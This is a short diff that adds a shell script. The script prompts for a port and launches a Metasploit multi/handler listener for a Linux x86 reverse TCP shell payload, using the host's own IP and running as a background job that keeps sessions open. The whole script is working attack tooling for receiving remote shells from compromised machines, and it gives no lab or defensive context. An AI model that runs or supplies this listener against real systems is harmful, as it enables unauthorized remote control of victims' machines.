@@ -1,0 +1,4 @@
+echo "Enter port number:"
+read port_num
+
+msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST $(hostname -I); set LPORT $port_num; set ExitOnSession false; exploit -j"
